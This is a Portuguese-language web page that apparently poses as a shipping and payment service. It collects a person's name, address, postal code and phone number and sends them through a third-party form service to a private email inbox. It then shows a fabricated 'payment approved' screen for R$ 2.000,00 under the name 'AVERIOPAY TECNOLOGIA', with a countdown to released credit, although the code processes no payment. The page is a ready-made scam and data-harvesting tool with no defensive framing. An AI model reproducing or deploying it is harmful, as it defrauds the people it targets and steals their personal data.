<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Envio do Produto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      background-color: #f5f5f5;
      color: #333;
    }
    .tela {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      padding: 20px;
    }
    .ativa {
      display: flex;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 20px;
    }
    form {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
    }
    label {
      margin-top: 10px;
      font-weight: bold;
    }
    input {
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      margin-top: 20px;
      padding: 12px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }
    .container-final {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    .valor {
      font-size: 32px;
      color: green;
      font-weight: bold;
    }
    .contagem {
      font-size: 18px;
      margin-top: 10px;
    }
    .logo {
      margin-top: 20px;
      font-size: 14px;
      color: #777;
    }
  </style>
</head>
<body>

<!-- Tela 1 -->
<div class="tela ativa" id="tela1">
  <h1>Preencha seus dados de entrega</h1>
  <form onsubmit="enviarFormulario(event)">
    <label>Nome completo</label>
    <input type="text" name="nome" required>
    <label>Endereço</label>
    <input type="text" name="endereco" required>
    <label>Número</label>
    <input type="text" name="numero" required>
    <label>Complemento</label>
    <input type="text" name="complemento">
    <label>CEP</label>
    <input type="text" name="cep" required>
    <label>Cidade</label>
    <input type="text" name="cidade" required>
    <label>Estado</label>
    <input type="text" name="estado" required>
    <label>Telefone</label>
    <input type="text" name="telefone" required>
    <button type="submit">Enviar dados</button>
  </form>
</div>

<!-- Tela 2 -->
<div class="tela" id="tela2">
  <div class="container-final">
    <h1>Pagamento aprovado com sucesso!</h1>
    <p>Valor recebido: <span class="valor">R$ 2.000,00</span></p>
    <p class="contagem">Crédito será liberado em: <span id="contador">10</span> segundos</p>
    <p class="logo">AVERIOPAY TECNOLOGIA</p>
  </div>
</div>

<script>
  function enviarFormulario(event) {
    event.preventDefault();
    const formData = new FormData(event.target);
    const dados = {};
    formData.forEach((value, key) => {
      dados[key] = value;
    });

    // Enviar os dados por e-mail via FormSubmit
    fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
      method: "POST",
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(dados)
    }).then(response => {
      if (response.ok) {
        mostrarTela2();
      } else {
        alert("Erro ao enviar, tente novamente.");
      }
    }).catch(error => {
      alert("Erro de conexão.");
    });
  }

  function mostrarTela2() {
    document.getElementById("tela1").classList.remove("ativa");
    document.getElementById("tela2").classList.add("ativa");
    iniciarContador();
  }

  function iniciarContador() {
    let tempo = 10;
    const el = document.getElementById("contador");
    const intervalo = setInterval(() => {
      tempo--;
      el.textContent = tempo;
      if (tempo <= 0) {
        clearInterval(intervalo);
        el.textContent = "Crédito liberado!";
      }
    }, 1000);
  }
</script>

</body>
</html>
